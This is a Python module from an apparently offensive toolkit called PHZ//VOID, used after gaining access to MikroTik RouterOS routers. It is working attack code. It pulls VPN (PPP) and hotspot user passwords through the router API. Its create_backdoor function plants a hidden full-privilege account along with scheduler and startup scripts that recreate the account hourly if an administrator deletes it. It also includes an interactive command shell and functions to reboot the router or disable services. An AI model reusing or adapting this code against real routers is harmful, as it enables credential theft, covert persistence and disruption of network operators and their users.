#!/usr/bin/env python3
# PHZ//VOID - Module 3: Command Execution
# Eksekusi perintah pada RouterOS setelah mendapatkan akses

import os
import sys
import time
import re
from typing import Dict, List, Optional, Any, Tuple
from datetime import datetime

sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from core.utils import HackerStyle, Logger
from lib.mikrotik_api import MikrotikAPI


class CommandExecutor:
    """
    Command Execution Module
    Eksekusi perintah pada MikroTik RouterOS
    """
    
    # Common useful commands
    COMMANDS = {
        "info": {
            "cmd": "/system/resource/print",
            "description": "System resource information"
        },
        "version": {
            "cmd": "/system/package/print",
            "description": "RouterOS version and packages"
        },
        "identity": {
            "cmd": "/system/identity/print",
            "description": "Router identity"
        },
        "users": {
            "cmd": "/user/print",
            "description": "List all users"
        },
        "interfaces": {
            "cmd": "/interface/print",
            "description": "List all interfaces"
        },
        "ip_address": {
            "cmd": "/ip/address/print",
            "description": "IP addresses configured"
        },
        "routes": {
            "cmd": "/ip/route/print",
            "description": "Routing table"
        },
        "firewall": {
            "cmd": "/ip/firewall/filter/print",
            "description": "Firewall rules"
        },
        "connections": {
            "cmd": "/ip/firewall/connection/print",
            "description": "Active connections"
        },
        "arp": {
            "cmd": "/ip/arp/print",
            "description": "ARP table"
        },
        "dhcp_leases": {
            "cmd": "/ip/dhcp-server/lease/print",
            "description": "DHCP leases"
        },
        "hotspot_users": {
            "cmd": "/ip/hotspot/user/print",
            "description": "Hotspot users"
        },
        "ppp_secrets": {
            "cmd": "/ppp/secret/print",
            "description": "PPP secrets (VPN users)"
        },
        "logs": {
            "cmd": "/log/print",
            "description": "System logs"
        },
        "scheduler": {
            "cmd": "/system/scheduler/print",
            "description": "Scheduled tasks"
        },
        "scripts": {
            "cmd": "/system/script/print",
            "description": "System scripts"
        },
        "services": {
            "cmd": "/ip/service/print",
            "description": "Enabled services"
        },
        "neighbors": {
            "cmd": "/ip/neighbor/print",
            "description": "Discovered neighbors (CDP/LLDP)"
        },
        "export": {
            "cmd": "/export",
            "description": "Full configuration export"
        },
        "export_compact": {
            "cmd": "/export compact",
            "description": "Compact configuration export"
        }
    }
    
    def __init__(self, api: MikrotikAPI):
        """
        Initialize command executor
        
        Args:
            api: Connected and authenticated MikrotikAPI instance
        """
        self.api = api
        self.logger = Logger("CmdExec")
        self.command_history = []
        
        if not api.is_connected():
            HackerStyle.warning("API not connected. Commands may fail.")
    
    def execute(self, command: str, timeout: int = 30) -> Dict:
        """
        Execute single RouterOS command
        
        Args:
            command: RouterOS command to execute
            timeout: Command timeout in seconds
            
        Returns:
            Dict with command result
        """
        result = {
            'command': command,
            'success': False,
            'output': [],
            'error': None,
            'timestamp': datetime.now().isoformat()
        }
        
        try:
            HackerStyle.debug(f"Executing: {command}")
            response = self.api.execute(command)
            
            if response:
                # Parse response
                for item in response:
                    if '_error' in item:
                        result['error'] = item.get('=message', 'Unknown error')
                    else:
                        # Clean up response (remove underscores)
                        cleaned = {}
                        for k, v in item.items():
                            if not k.startswith('_'):
                                cleaned[k.lstrip('=')] = v
                        if cleaned:
                            result['output'].append(cleaned)
                
                result['success'] = len(result['output']) > 0 or not result['error']
            
            self.command_history.append(result)
            return result
            
        except Exception as e:
            result['error'] = str(e)
            self.logger.error(f"Command failed: {e}")
            return result
    
    def execute_multiple(self, commands: List[str]) -> List[Dict]:
        """
        Execute multiple commands
        
        Args:
            commands: List of RouterOS commands
            
        Returns:
            List of results
        """
        results = []
        for cmd in commands:
            result = self.execute(cmd)
            results.append(result)
            time.sleep(0.5)  # Small delay between commands
        return results
    
    def run_preset(self, preset_name: str) -> Dict:
        """
        Run a preset command by name
        
        Args:
            preset_name: Name of preset command (see COMMANDS dict)
            
        Returns:
            Command result
        """
        if preset_name not in self.COMMANDS:
            return {
                'success': False,
                'error': f"Unknown preset: {preset_name}",
                'available': list(self.COMMANDS.keys())
            }
        
        cmd_info = self.COMMANDS[preset_name]
        HackerStyle.info(f"Running: {cmd_info['description']}")
        
        return self.execute(cmd_info['cmd'])
    
    def get_system_info(self) -> Dict:
        """Get comprehensive system information"""
        info = {}
        
        # Collect system info
        presets = ['info', 'identity', 'version', 'users', 'interfaces', 'services']
        
        for preset in presets:
            result = self.run_preset(preset)
            if result['success']:
                info[preset] = result['output']
        
        return info
    
    def get_network_info(self) -> Dict:
        """Get network configuration information"""
        info = {}
        
        presets = ['ip_address', 'routes', 'arp', 'neighbors']
        
        for preset in presets:
            result = self.run_preset(preset)
            if result['success']:
                info[preset] = result['output']
        
        return info
    
    def get_secrets(self) -> Dict:
        """Extract sensitive information (passwords, secrets)"""
        secrets = {
            'users': [],
            'ppp_secrets': [],
            'hotspot_users': []
        }
        
        # Get users
        result = self.execute("/user/print")
        if result['success']:
            for user in result['output']:
                if 'name' in user:
                    user_info = {
                        'name': user.get('name', ''),
                        'group': user.get('group', ''),
                        'disabled': user.get('disabled', 'false')
                    }
                    secrets['users'].append(user_info)
        
        # Get PPP secrets (VPN credentials)
        result = self.execute("/ppp/secret/print")
        if result['success']:
            for secret in result['output']:
                if 'name' in secret:
                    secret_info = {
                        'name': secret.get('name', ''),
                        'password': secret.get('password', ''),
                        'service': secret.get('service', ''),
                        'profile': secret.get('profile', '')
                    }
                    secrets['ppp_secrets'].append(secret_info)
        
        # Get hotspot users
        result = self.execute("/ip/hotspot/user/print")
        if result['success']:
            for user in result['output']:
                if 'name' in user:
                    user_info = {
                        'name': user.get('name', ''),
                        'password': user.get('password', ''),
                        'profile': user.get('profile', ''),
                        'limit_uptime': user.get('limit-uptime', '')
                    }
                    secrets['hotspot_users'].append(user_info)
        
        return secrets
    
    def backup_config(self, filename: str = None) -> bool:
        """
        Create backup of router configuration
        
        Args:
            filename: Backup filename (without extension)
            
        Returns:
            True if successful
        """
        if not filename:
            filename = f"backup_{datetime.now().strftime('%Y%m%d_%H%M%S')}"
        
        result = self.execute(f"/system/backup/save name={filename}")
        return result['success']
    
    def export_config(self, compact: bool = True) -> str:
        """
        Export full configuration
        
        Args:
            compact: Use compact format
            
        Returns:
            Configuration as string
        """
        cmd = "/export compact" if compact else "/export"
        result = self.execute(cmd)
        
        if result['success']:
            config_lines = []
            for item in result['output']:
                for key, value in item.items():
                    if not key.startswith('_'):
                        config_lines.append(f"{key} {value}")
            return '\n'.join(config_lines)
        
        return ""
    
    def add_user(self, username: str, password: str, group: str = "read") -> bool:
        """
        Add new user to router
        
        Args:
            username: Username for new account
            password: Password for new account
            group: User group (read, write, full)
            
        Returns:
            True if successful
        """
        result = self.execute(f"/user/add name={username} password={password} group={group}")
        if result['success']:
            HackerStyle.success(f"User {username} added successfully!")
        return result['success']
    
    def delete_user(self, username: str) -> bool:
        """
        Delete user from router
        
        Args:
            username: Username to delete
            
        Returns:
            True if successful
        """
        # First find user ID
        find_result = self.execute(f"/user/print where name={username}")
        if find_result['success'] and find_result['output']:
            user_id = find_result['output'][0].get('.id', username)
            result = self.execute(f"/user/remove {user_id}")
            if result['success']:
                HackerStyle.success(f"User {username} deleted!")
                return True
        
        return False
    
    def add_firewall_rule(self, chain: str = "input", action: str = "drop", 
                          src_addr: str = None, dst_port: int = None) -> bool:
        """
        Add firewall rule
        
        Args:
            chain: Firewall chain (input, forward, output)
            action: Action (drop, accept, reject)
            src_addr: Source address
            dst_port: Destination port
            
        Returns:
            True if successful
        """
        cmd = f"/ip/firewall/filter/add chain={chain} action={action}"
        if src_addr:
            cmd += f" src-address={src_addr}"
        if dst_port:
            cmd += f" dst-port={dst_port} protocol=tcp"
        
        result = self.execute(cmd)
        return result['success']
    
    def change_port(self, service: str, new_port: int) -> bool:
        """
        Change service port
        
        Args:
            service: Service name (ssh, winbox, api, www, www-ssl)
            new_port: New port number
            
        Returns:
            True if successful
        """
        result = self.execute(f"/ip/service set {service} port={new_port}")
        if result['success']:
            HackerStyle.success(f"{service} port changed to {new_port}")
        return result['success']
    
    def disable_service(self, service: str) -> bool:
        """
        Disable a service
        
        Args:
            service: Service name (winbox, api, telnet, ftp, www, ssh)
            
        Returns:
            True if successful
        """
        result = self.execute(f"/ip/service disable {service}")
        if result['success']:
            HackerStyle.success(f"{service} has been disabled")
        return result['success']
    
    def reboot(self) -> bool:
        """
        Reboot the router
        
        Returns:
            True if command sent successfully
        """
        HackerStyle.warning("Rebooting router...")
        result = self.execute("/system/reboot")
        return result['success']
    
    def create_backdoor(self, username: str = "phzvoid", password: str = None) -> Dict:
        """
        Create persistent backdoor on router
        
        Args:
            username: Backdoor username
            password: Backdoor password (auto-generate if None)
            
        Returns:
            Dict with backdoor details
        """
        import secrets
        import string
        
        if not password:
            # Generate random password
            alphabet = string.ascii_letters + string.digits
            password = ''.join(secrets.choice(alphabet) for _ in range(12))
        
        backdoor = {
            'username': username,
            'password': password,
            'created': datetime.now().isoformat(),
            'methods': []
        }
        
        # Method 1: Add hidden user
        result = self.add_user(username, password, "full")
        if result:
            backdoor['methods'].append('user_account')
        
        # Method 2: Add scheduled script to recreate user if deleted
        script = f"""
:if ([:len [/user find name={username}]] = 0) do={{
  /user add name={username} password={password} group=full
}}
"""
        script_result = self.execute(f"/system/script add name=restore_{username} source=\"{script}\"")
        if script_result['success']:
            self.execute(f"/system/scheduler add name=restore_{username} interval=1h on-event=restore_{username}")
            backdoor['methods'].append('scheduled_restore')
        
        # Method 3: Add to startup
        startup_result = self.execute(f"/system/script add name=startup_{username} source=\"{script}\"")
        if startup_result['success']:
            self.execute(f"/system/script run startup_{username}")
            backdoor['methods'].append('startup_script')
        
        if backdoor['methods']:
            HackerStyle.success(f"Backdoor created: {username}:{password}")
            HackerStyle.info(f"Methods: {', '.join(backdoor['methods'])}")
        else:
            HackerStyle.error("Failed to create backdoor")
        
        return backdoor
    
    def interactive_shell(self):
        """
        Interactive shell for manual command execution
        """
        HackerStyle.info("Entering interactive shell. Type 'exit' to quit, 'help' for commands.")
        print("="*60)
        
        while True:
            try:
                # Get current identity for prompt
                identity = "RouterOS"
                result = self.execute("/system/identity/print")
                if result['success'] and result['output']:
                    identity = result['output'][0].get('name', 'RouterOS')
                
                cmd = input(f"\n{HackerStyle.GREEN}{identity}{HackerStyle.RESET}> ")
                
                if cmd.lower() in ['exit', 'quit']:
                    HackerStyle.info("Exiting interactive shell")
                    break
                
                if cmd.lower() == 'help':
                    self._show_help()
                    continue
                
                if cmd.lower() == 'clear':
                    os.system('cls' if os.name == 'nt' else 'clear')
                    continue
                
                if cmd.strip():
                    result = self.execute(cmd)
                    
                    if result['success']:
                        for item in result['output']:
                            for key, value in item.items():
                                print(f"  {key}: {value}")
                    else:
                        HackerStyle.error(f"Error: {result['error']}")
                        
            except KeyboardInterrupt:
                HackerStyle.warning("\nExiting...")
                break
            except Exception as e:
                HackerStyle.error(f"Error: {e}")
    
    def _show_help(self):
        """Show help for interactive shell"""
        print("\n" + HackerStyle.CYAN + "Available commands:" + HackerStyle.RESET)
        print("  help           - Show this help")
        print("  clear          - Clear screen")
        print("  exit/quit      - Exit interactive shell")
        print("\n" + HackerStyle.CYAN + "Preset commands:" + HackerStyle.RESET)
        for name, info in self.COMMANDS.items():
            print(f"  {name:15} - {info['description']}")
        print("\n" + HackerStyle.CYAN + "Any RouterOS command is accepted!" + HackerStyle.RESET)
    
    def generate_report(self) -> str:
        """
        Generate comprehensive system report
        
        Returns:
            Report as string
        """
        report_lines = []
        report_lines.append("="*70)
        report_lines.append(f"  PHZ//VOID - SYSTEM REPORT")
        report_lines.append(f"  Generated: {datetime.now().isoformat()}")
        report_lines.append("="*70)
        
        # System Info
        report_lines.append("\n[SYSTEM INFORMATION]")
        info = self.get_system_info()
        if info.get('info'):
            for item in info['info']:
                for k, v in item.items():
                    report_lines.append(f"  {k}: {v}")
        
        # Network Info
        report_lines.append("\n[NETWORK INFORMATION]")
        net_info = self.get_network_info()
        if net_info.get('ip_address'):
            report_lines.append("  IP Addresses:")
            for ip in net_info['ip_address']:
                report_lines.append(f"    {ip.get('address', 'N/A')} on {ip.get('interface', 'N/A')}")
        
        # Users
        report_lines.append("\n[USER ACCOUNTS]")
        users = self.get_secrets().get('users', [])
        for user in users:
            status = "DISABLED" if user.get('disabled') == 'true' else "ENABLED"
            report_lines.append(f"  {user.get('name', '')} [{user.get('group', '')}] - {status}")
        
        # Security Issues
        report_lines.append("\n[SECURITY ISSUES]")
        
        # Check for default admin
        for user in users:
            if user.get('name') == 'admin' and user.get('disabled') != 'true':
                report_lines.append("  [!] Default 'admin' account is still enabled!")
        
        # Check dangerous services
        services_result = self.execute("/ip/service/print")
        if services_result['success']:
            dangerous = ['winbox', 'telnet', 'ftp']
            for svc in services_result['output']:
                name = svc.get('name', '')
                if name in dangerous and svc.get('disabled') != 'true':
                    report_lines.append(f"  [!] {name} service is enabled (known vulnerabilities!)")
        
        report_lines.append("\n" + "="*70)
        
        return '\n'.join(report_lines)


# Test/Standalone execution
if __name__ == "__main__":
    HackerStyle.banner()
    
    print("\n" + "="*60)
    print("  Command Execution Module - Test Mode")
    print("="*60 + "\n")
    
    target = input(HackerStyle.CYAN + "[?] Target IP: " + HackerStyle.RESET)
    port = input(HackerStyle.CYAN + "[?] API Port (default 8728): " + HackerStyle.RESET)
    username = input(HackerStyle.CYAN + "[?] Username: " + HackerStyle.RESET)
    password = input(HackerStyle.CYAN + "[?] Password: " + HackerStyle.RESET)
    
    if not port:
        port = 8728
    else:
        port = int(port)
    
    # Connect
    api = MikrotikAPI(target, port=port, use_ssl=False)
    
    if api.connect():
        HackerStyle.success("Connected!")
        
        if api.login(username, password):
            HackerStyle.success("Logged in!")
            
            executor = CommandExecutor(api)
            
            print("\n" + HackerStyle.YELLOW + "Select mode:" + HackerStyle.RESET)
            print("  1. Run preset command")
            print("  2. Interactive shell")
            print("  3. Extract secrets")
            print("  4. Generate report")
            print("  5. Create backdoor")
            
            choice = input("\n" + HackerStyle.CYAN + "[?] Choice: " + HackerStyle.RESET)
            
            if choice == "1":
                print("\nAvailable presets:")
                for name, info in executor.COMMANDS.items():
                    print(f"  {name:15} - {info['description']}")
                
                preset = input("\n" + HackerStyle.CYAN + "[?] Preset name: " + HackerStyle.RESET)
                result = executor.run_preset(preset)
                
                if result['success']:
                    print("\n" + HackerStyle.GREEN + "=== OUTPUT ===" + HackerStyle.RESET)
                    for item in result['output']:
                        for k, v in item.items():
                            print(f"  {k}: {v}")
                else:
                    HackerStyle.error(f"Failed: {result.get('error', 'Unknown error')}")
            
            elif choice == "2":
                executor.interactive_shell()
            
            elif choice == "3":
                secrets = executor.get_secrets()
                print("\n" + HackerStyle.YELLOW + "=== EXTRACTED SECRETS ===" + HackerStyle.RESET)
                
                if secrets['users']:
                    print("\n[USERS]")
                    for user in secrets['users']:
                        print(f"  {user}")
                
                if secrets['ppp_secrets']:
                    print("\n[PPP SECRETS (VPN)]")
                    for secret in secrets['ppp_secrets']:
                        print(f"  {secret}")
                
                if secrets['hotspot_users']:
                    print("\n[HOTSPOT USERS]")
                    for user in secrets['hotspot_users']:
                        print(f"  {user}")
            
            elif choice == "4":
                report = executor.generate_report()
                print("\n" + report)
                
                # Save report
                filename = f"reports/report_{target}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
                os.makedirs("reports", exist_ok=True)
                with open(filename, 'w') as f:
                    f.write(report)
                HackerStyle.success(f"Report saved to {filename}")
            
            elif choice == "5":
                backname = input(HackerStyle.CYAN + "[?] Backdoor username (default: phzvoid): " + HackerStyle.RESET)
                if not backname:
                    backname = "phzvoid"
                
                backdoor = executor.create_backdoor(backname)
                print("\n" + HackerStyle.GREEN + "=== BACKDOOR CREATED ===" + HackerStyle.RESET)
                print(f"  Username: {backdoor['username']}")
                print(f"  Password: {backdoor['password']}")
                print(f"  Methods: {', '.join(backdoor['methods'])}")
            
            else:
                HackerStyle.error("Invalid choice")
        
        api.disconnect()
    else:
        HackerStyle.error("Connection failed!")